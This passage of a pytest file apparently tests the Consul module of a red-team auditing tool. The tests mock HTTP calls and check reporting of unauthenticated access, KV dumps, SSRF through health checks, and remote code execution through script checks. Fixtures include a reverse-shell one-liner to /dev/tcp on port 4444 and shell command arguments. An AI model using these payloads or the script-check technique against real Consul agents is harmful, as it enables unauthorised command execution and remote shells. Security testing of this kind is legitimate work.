    monkeypatch.setattr(
        consul,
        "_consul_script_revshell_cleanup",
        lambda *_a, **_k: {
            "action": "delete",
            "queried": True,
            "matched": 1,
            "deleted": 1,
            "items": [{"check_id": "x", "ok": True}],
        },
    )

    record = consul._audit_consul_host_core(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token="root",
        username=None,
        password=None,
        do_ssrf=True,
        ssrf_urls=["http://127.0.0.1:9100"],
        show_keys=True,
        kv_key=None,
        dump_requested=True,
        dump_all_requested=True,
        show_services=True,
        show_agents=True,
        show_checks=True,
        check_dump_id=None,
        show_nodes=True,
        service_name="svc",
        service_dump_name="web",
        agent_dump_name="n1",
        node_dump_name="n1",
        delete_service=True,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=True,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id="id-1",
    )
    assert record["is_consul"] is True
    assert record["status"] == "ok"
    assert record["auth_mode"] == "token"
    assert record["auth_valid"] is True
    assert record["rce"] is True
    assert record["service_result"]["ok"] is True
    assert record["script_revshell"]["action"] == "delete"
    assert record["ssrf_results"][0]["registered"] is True


def test_detail_lines_error_and_revshell_variants() -> None:
    base = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "anonymous_scopes": {},
        "auth_scopes": {},
        "keys_requested": True,
        "dump_requested": False,
        "kv_keys_list": None,
        "kv_keys_error": "denied",
        "services_list_requested": True,
        "services_list": None,
        "services_list_error": "forbidden",
        "agents_list_requested": True,
        "agents_list": None,
        "agents_list_error": "forbidden",
        "checks_list_requested": True,
        "checks_list": None,
        "checks_list_error": "forbidden",
        "nodes_list_requested": True,
        "nodes_list": None,
        "nodes_list_error": "forbidden",
        "service_result": {"name": "svc", "action": "create", "ok": False, "error": "boom", "status": 500},
        "ssrf_results": [
            {
                "target_url": "http://127.0.0.1:9100",
                "registered": False,
                "register_error": "denied",
                "status": "",
                "poll_error": "timeout",
                "output": "",
                "deregistered": False,
                "deregister_error": "missing",
            }
        ],
    }
    delete_record = {
        **base,
        "script_revshell": {
            "action": "delete",
            "target_check_id": "id-1",
            "queried": False,
            "query_error": "permission denied",
            "matched": 0,
            "deleted": 0,
            "items": [],
        },
    }
    create_record = {
        **base,
        "script_revshell": {
            "action": "create",
            "listener": "127.0.0.1:4444",
            "auto_cleanup": False,
            "script": "bash -i",
            "registered": False,
            "register_error": "forbidden",
            "register_status": 403,
        },
    }

    delete_lines = consul._detail_lines(delete_record, "txt", debug=True)
    delete_text = "\n".join(delete_lines)
    assert "keys unavailable err=denied" in delete_text
    assert "services unavailable err=forbidden" in delete_text
    assert "agents unavailable err=forbidden" in delete_text
    assert "checks unavailable err=forbidden" in delete_text
    assert "nodes unavailable err=forbidden" in delete_text
    assert "service create failed err=boom status=500" in delete_text
    assert "check register failed err=denied" in delete_text
    assert "probe failed err=timeout" in delete_text
    assert "checks query failed err=permission denied" in delete_text

    create_lines = consul._detail_lines(create_record, "txt", debug=True)
    create_text = "\n".join(create_lines)
    assert "Reverse-shell script-check (listener:127.0.0.1:4444) (auto_cleanup:False)" in create_text
    assert "payload=bash -i" in create_text
    assert "check register failed err=forbidden" in create_text


def test_audit_consul_host_staged_deep_fail_and_detect_only(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(consul, "_retry_delay", lambda _i: 0.0)
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_a, **_k: (True, "http", False, False, "127.0.0.1:8300", None),
    )
    monkeypatch.setattr(consul, "_consul_access_matrix", lambda *_a, **_k: _scope_fixture(True, True, True))
    monkeypatch.setattr(
        consul,
        "_agent_self_probe",
        lambda *_a, **_k: {
            "ok": True,
            "error": None,
            "version": "1.17.3",
            "local_script_checks": True,
            "remote_script_checks": True,
        },
    )
    monkeypatch.setattr(
        consul,
        "_audit_consul_host_core",
        lambda *_a, **_k: {"is_consul": False, "status": "fail", "error": "deep failed"},
    )

    deep_fail = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
        debug=True,
        run_deep_checks=True,
    )
    assert deep_fail["is_consul"] is True
    assert deep_fail["status"] == "open_no_auth"
    assert deep_fail["error"] == "deep failed"

    detect_only = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
        debug=True,
        run_deep_checks=False,
    )
    assert detect_only["status"] == "open_no_auth"
    assert any("detect-only result=open_no_auth" in event for event in (detect_only.get("debug_events") or []))


def test_run_consul_stage_dump_all_inference(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    captured: list[dict[str, object]] = []

    def fake_audit(**kwargs):
        captured.append(kwargs)
        if kwargs.get("command_progress") is not None:
            kwargs["command_progress"].advance(len(kwargs.get("hosts", [])))
        return (1, 1, 0, False)

    patch_runner_for_legacy_target_fake(monkeypatch, "consul", fake_audit)
    rc = consul.run_consul_stage(_consul_args(debug=True, dump=True), logger=object())
    assert rc == 0
    assert captured
    assert captured[0]["dump_all_requested"] is True
    assert captured[0]["show_services"] is True
    assert captured[0]["show_agents"] is True
    assert captured[0]["show_checks"] is True
    assert captured[0]["show_nodes"] is True


def test_run_consul_stage_multi_port_uses_single_global_progress(monkeypatch: pytest.MonkeyPatch) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)

    class _FakeProgress:
        instances: list[_FakeProgress] = []

        def __init__(self, _label: str, total: int, *, enabled: bool = True, leave: bool = True) -> None:
            _ = (enabled, leave)
            self.total = total
            self.advances: list[int] = []
            self.closed = False
            type(self).instances.append(self)

        def advance(self, step: int = 1) -> None:
            self.advances.append(int(step))

        def close(self) -> None:
            self.closed = True

    monkeypatch.setattr(
        "redposture_core.stage_runtime.start_command_progress",
        lambda _args, label, total, **kwargs: _FakeProgress(label, total, **kwargs),
    )

    captured: list[dict[str, Any]] = []

    def fake_audit(**kwargs):
        captured.append(kwargs)
        if kwargs.get("command_progress") is not None:
            kwargs["command_progress"].advance(len(kwargs.get("hosts", [])))
        return (len(kwargs["hosts"]), 1, 0, False)

    patch_runner_for_legacy_target_fake(monkeypatch, "consul", fake_audit)

    rc = consul.run_consul_stage(_consul_args(ports="8500,8501"), logger=object())
    assert rc == 0
    assert len(captured) == 2
    assert all(call["show_progress"] is False for call in captured)
    assert len(_FakeProgress.instances) == 1
    progress = _FakeProgress.instances[0]
    assert progress.total == 2
    assert progress.advances == [1, 1]
    assert progress.closed is True


def test_ssl_context_and_http_request_branches(monkeypatch: pytest.MonkeyPatch) -> None:
    class _Resp:
        status = 200
        headers = {"X-Test": "ok"}

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb) -> None:
            _ = (exc_type, exc, tb)
            return None

        def read(self) -> bytes:
            return b'{"ok":true}'

    assert consul._ssl_context(use_https=False, insecure=False) is None
    strict_ctx = consul._ssl_context(use_https=True, insecure=False)
    insecure_ctx = consul._ssl_context(use_https=True, insecure=True)
    assert strict_ctx is not None and strict_ctx.verify_mode == ssl.CERT_REQUIRED
    assert insecure_ctx is not None and insecure_ctx.verify_mode == ssl.CERT_NONE

    monkeypatch.setattr(consul.urllib.request, "urlopen", lambda *_a, **_k: _Resp())
    status, payload, headers, error = consul._http_request(
        "127.0.0.1",
        8500,
        "GET",
        "/v1/status/leader",
        1.0,
        use_https=False,
        insecure=False,
        headers={"X-Test": "1"},
    )
    assert status == 200 and error is None
    assert b'"ok"' in payload
    assert headers["x-test"] == "ok"

    http_error = urllib.error.HTTPError(
        "http://127.0.0.1:8500/v1/status/leader",
        403,
        "Forbidden",
        {"X-Err": "yes"},
        io.BytesIO(b'{"error":"denied"}'),
    )
    monkeypatch.setattr(consul.urllib.request, "urlopen", lambda *_a, **_k: (_ for _ in ()).throw(http_error))
    status2, payload2, headers2, error2 = consul._http_request(
        "127.0.0.1",
        8500,
        "GET",
        "/v1/status/leader",
        1.0,
        use_https=False,
        insecure=False,
    )
    assert status2 == 403 and error2 is None
    assert b"denied" in payload2 and headers2["x-err"] == "yes"

    monkeypatch.setattr(
        consul.urllib.request,
        "urlopen",
        lambda *_a, **_k: (_ for _ in ()).throw(urllib.error.URLError(TimeoutError("timed out"))),
    )
    status3, payload3, headers3, error3 = consul._http_request(
        "127.0.0.1",
        8500,
        "GET",
        "/v1/status/leader",
        1.0,
        use_https=True,
        insecure=False,
    )
    assert status3 == 0 and payload3 == b"" and headers3 == {}
    assert error3 == "connection timeout"


def test_render_colored_consul_line_and_revshell_detail_variants() -> None:
    class _ColorConsole:
        def __init__(self) -> None:
            self.lines: list[str] = []

        def _paint(self, text: str, color: str, _stream) -> str:
            return f"<{color}>{text}</{color}>"

        def plain(self, line: str, color: str | None = None) -> None:
            _ = color
            self.lines.append(line)

    console = _ColorConsole()
    rendered = consul._render_colored_consul_line(
        console, "CONSUL\t127.0.0.1\t8500\t [*] Consul Agent (auth required:True) (kv:3)"
    )
    assert rendered is True
    assert console.lines and "bright_green" in console.lines[0]

    assert consul._render_colored_consul_line(console, "OTHER\t127.0.0.1\t8500\t[*] skip") is False

    rec_left_registered = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "script_revshell": {
            "action": "create",
            "listener": "127.0.0.1:4444",
            "script": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "registered": True,
            "check_id": "rp-1",
            "wait_seconds": 1.2,
            "auto_cleanup": False,
        },
    }
    lines_left = consul._detail_lines(rec_left_registered, "txt")
    joined_left = "\n".join(lines_left)
    assert "Reverse-shell script-check" in joined_left
    assert "check left registered" in joined_left

    rec_register_failed = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "script_revshell": {
            "action": "create",
            "registered": False,
            "register_status": 403,
        },
    }
    lines_fail = consul._detail_lines(rec_register_failed, "txt")
    assert any("check register failed err=status=403" in line for line in lines_fail)


def test_consul_checks_and_health_error_paths(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (500, {"x": 1}, None, False, False))
    status, payload, error = consul._consul_get_checks(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert status == 500 and payload is None and error == "status=500"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, "bad", None, False, False))
    status2, payload2, error2 = consul._consul_get_checks(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert status2 == 200 and payload2 is None and error2 == "invalid checks response"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (403, None, None, False, False))
    instances, instances_error = consul._consul_health_service_instances(
        "127.0.0.1",
        8500,
        "web",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        agent_checks=None,
    )
    assert instances is None and instances_error == "Forbidden"

    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, {"bad": "shape"}, None, False, False))
    instances2, instances_error2 = consul._consul_health_service_instances(
        "127.0.0.1",
        8500,
        "web",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        agent_checks=None,
    )
    assert instances2 is None and instances_error2 == "invalid health service response"


def test_detail_lines_branch_matrix_for_errors_and_cleanup() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "anonymous_scopes": {"kv": {"ok": False, "count": 0, "status": 403, "error": "denied"}},
        "keys_requested": True,
        "dump_requested": False,
        "kv_keys_list": None,
        "kv_keys_error": "forbidden",
        "dump_all_requested": False,
        "services_list_requested": True,
        "services_list": None,
        "services_list_error": "forbidden",
        "agents_list_requested": True,
        "agents_list": [],
        "agent_dump_name": "node-404",
        "checks_list_requested": True,
        "checks_list": [],
        "check_dump_id": "check-404",
        "nodes_list_requested": True,
        "nodes_list": None,
        "nodes_list_error": "forbidden",
        "service_result": {"name": "web", "action": "delete", "ok": False, "error": "denied", "status": 403},
        "ssrf_results": [
            {
                "target_url": "http://127.0.0.1:9100/metrics",
                "registered": False,
                "register_error": "status=500",
                "poll_error": "timeout",
                "deregistered": False,
                "deregister_error": "status=500",
            }
        ],
        "script_revshell": {
            "action": "delete",
            "target_check_id": "rp-check",
            "queried": True,
            "matched": 2,
            "deleted": 1,
            "items": [
                {"check_id": "rp-check", "ok": True},
                {"check_id": "rp-check-2", "ok": False, "status": 403},
            ],
        },
    }
    lines = consul._detail_lines(record, "txt", debug=True)
    joined = "\n".join(lines)
    assert "keys unavailable err=forbidden" in joined
    assert "services unavailable err=forbidden" in joined
    assert "<agent not found>" in joined
    assert "<check not found>" in joined
    assert "nodes unavailable err=forbidden" in joined
    assert "service delete failed err=denied status=403" in joined
    assert "check register failed err=status=500" in joined
    assert "probe failed err=timeout" in joined
    assert "check deregister failed err=status=500" in joined
    assert "matched=2 deleted=1" in joined
    assert "check deregistered id=rp-check" in joined
    assert "check deregister failed id=rp-check-2 err=status=403" in joined


def test_consul_detail_lines_cover_inventory_action_and_revshell_branches() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "scheme": "https",
        "tls_auto_insecure": True,
        "anonymous_scopes": _scope_fixture(True, False, False),
        "auth_scopes": _scope_fixture(False, True, True),
        "local_script_checks": True,
        "remote_script_checks": True,
        "rce": True,
        "keys_requested": True,
        "dump_requested": True,
        "dump_all_requested": True,
        "kv_key_requested": "",
        "kv_dump_items": [{"key": "config/db", "value": "postgres://u:p@db/app"}],
        "services_list_requested": True,
        "services_list_source": "token",
        "service_dump_name": "web",
        "services_list": [{"name": "web"}, {"name": "empty"}, {"name": "broken"}],
        "service_instances": {
            "web": [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"redposture_args": "--token secret", "owner": "platform"},
                    "checks": [
                        {
                            "check_id": "service:web-1",
                            "name": "HTTP health",
                            "status": "passing",
                            "script": "/bin/check",
                            "type": "script",
                            "namespace": "default",
                            "partition": "default",
                            "http": "http://web/health",
                            "tcp": "web:8080",
                            "grpc": "web:9090",
                            "method": "GET",
                            "args": ["/bin/sh", "-c", "id"],
                            "interval": "10s",
                            "timeout": "2s",
                            "ttl": "30s",
                            "deregister_after": "1m",
                            "notes": "contains\nnotes",
                            "definition_raw": "{raw}",
                            "output": "ok\n",
                        }
                    ],
                }
            ],
            "empty": [],
        },
        "service_instances_errors": {"broken": "denied"},
        "agents_list_requested": True,
        "agents_list_source": "token",
        "agent_dump_name": "node-1",
        "agents_list": [
            {"name": "node-1", "addr": "10.0.0.10", "dc": "dc1", "role": "server", "port": 8301, "status": "alive"}
        ],
        "checks_list_requested": True,
        "checks_list_source": "token",
        "check_dump_id": "check-1",
        "checks_list": [
            {
                "check_id": "check-1",
                "name": "Shell check",
                "status": "critical",
                "service_id": "svc-1",
                "script": "/bin/id",
                "type": "script",
                "namespace": "default",
                "partition": "default",
                "http": "http://svc/health",
                "tcp": "svc:80",
                "grpc": "svc:9090",
                "method": "GET",
                "args": ["id"],
                "interval": "5s",
                "timeout": "1s",
                "ttl": "20s",
                "deregister_after": "1m",
                "notes": "line one\nline two",
                "definition_raw": "{definition}",
                "output": "failed\n",
            }
        ],
        "nodes_list_requested": True,
        "nodes_list_source": "token",
        "node_dump_name": "node-1",
        "nodes_list": [{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}],
        "service_result": {
            "name": "rp-shell",
            "action": "create",
            "args": "id",
            "ok": False,
            "error": "denied",
            "status": 403,
        },
        "ssrf_results": [
            {
                "target_url": "http://callback.local/",
                "registered": True,
                "status": "critical",
                "output": "GET / HTTP/1.1\n",
                "deregistered": False,
                "deregister_error": "denied",
            }
        ],
        "script_revshell": {
            "action": "create",
            "listener": "10.0.0.1:4444",
            "auto_cleanup": True,
            "script": "bash -c id",
            "registered": True,
            "check_id": "redposture-shell-1",
            "wait_seconds": 1.5,
            "deregistered": False,
            "deregister_status": 403,
        },
    }

    lines = consul._detail_lines(record, "txt", debug=True)
    joined = "\n".join(lines)

    assert "Transport (scheme:https)" in joined
    assert "RCE!" in joined
    assert "KV Dump" in joined
    assert "config/db=postgres://u:p@db/app" in joined
    assert "Meta (service:web)" in joined
    assert "arg[1]=-c" in joined
    assert "service create failed err=denied status=403" in joined
    assert "SSRF Check" in joined
    assert "Reverse-shell script-check" in joined
    assert "check deregister failed err=status=403" in joined

    cleanup = dict(record)
    cleanup["script_revshell"] = {
        "action": "delete",
        "target_check_id": "redposture-shell-1",
        "queried": True,
        "matched": 2,
        "deleted": 1,
        "items": [
            {"check_id": "ok", "ok": True},
            {"check_id": "bad", "ok": False, "status": 500},
        ],
    }
    cleanup_lines = consul._detail_lines(cleanup, "txt", debug=True)
    assert "Reverse-shell cleanup" in "\n".join(cleanup_lines)
    assert "check deregister failed id=bad err=status=500" in "\n".join(cleanup_lines)
